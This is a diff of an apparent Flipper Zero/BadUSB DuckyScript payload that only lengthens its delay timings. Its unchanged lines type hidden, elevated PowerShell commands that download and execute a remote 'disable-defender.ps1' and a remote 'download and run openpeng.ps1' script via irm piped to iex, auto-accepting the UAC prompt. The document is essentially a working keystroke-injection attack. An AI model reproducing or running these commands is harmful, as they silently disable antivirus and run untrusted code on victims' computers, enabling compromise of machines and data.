@@ -6,10 +6,10 @@ DEFAULT_DELAY 100
 
 REM open powershell (remove -W Hidden to show the window).
 GUI r
-DELAY 750
+DELAY 4000
 STRING powershell -NoP -Ep Bypass -W H -C irm https://github.com/knoxoxen/flipperstuffs/raw/main/disable-defender.ps1 | iex
 CTRL-SHIFT ENTER
-DELAY 3000
+DELAY 10000
 ALT y
 
 REM some setup for dukie script
@@ -18,9 +18,9 @@ DEFAULT_DELAY 100
 REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
-DELAY 750
+DELAY 4000
 STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/knoxoxen/flipperstuffs/refs/heads/main/download%20and%20run%20openpeng.ps1 | iex
 CTRL-SHIFT ENTER 
-DELAY 3000
+DELAY 10000
 ALT y
 
